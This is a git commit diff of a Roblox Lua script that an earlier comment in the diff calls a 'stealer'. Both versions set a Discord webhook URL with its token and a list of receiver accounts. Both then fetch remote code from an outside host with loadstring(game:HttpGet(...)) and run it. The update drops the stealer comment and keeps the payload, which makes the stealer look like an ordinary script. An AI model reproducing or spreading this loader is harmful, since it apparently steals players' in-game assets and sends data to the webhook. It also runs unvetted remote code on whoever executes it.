4d666af35222ce4718ea2851b30983ee64516628
BrainrottScript <onlydevs86@gmail.com>
2025-10-22 16:33:43 +0800

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -1,8 +1,7 @@
-‎-- V2.1: stealer + loading screen + server hop for ps 
-‎
-‎getgenv().WEBHOOK = "https://discord.com/api/webhooks/1430458936418369607/uGeysRsMYFvUCi7cmLNwxDD61SLQ8_Ci14toYnc07CSR9QpwKXRC4dD-wYb-8CdqEfrL"
-‎getgenv().RECEIVERS = {"YashStorage", "YashStorage1", "YASHURA_Cion"}
-‎getgenv().MONEY_PER_SECOND = 500000 -- DEFAULT: 100000/s
-‎getgenv().DMG_PER_SECOND = 500000 -- DEFAULT: 100000/s
-‎
-‎loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/af28bcaaab24d45dae37ee66caab0c46ebe174087959085e88dee2d297fd6537/download"))()
+getgenv().WEBHOOK = "https://discord.com/api/webhooks/1430458936418369607/uGeysRsMYFvUCi7cmLNwxDD61SLQ8_Ci14toYnc07CSR9QpwKXRC4dD-wYb-8CdqEfrL"
+getgenv().RECEIVERS = {"YashStorage", "YashStorage1", "YashStorage2"}
+getgenv().MONEY_PER_SECOND = 100000 -- DEFAULT: 100000/s
+getgenv().DMG_PER_SECOND = 100000 -- DEFAULT: 100000/s
+
+
+loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/af28bcaaab24d45dae37ee66caab0c46ebe174087959085e88dee2d297fd6537/download"))()
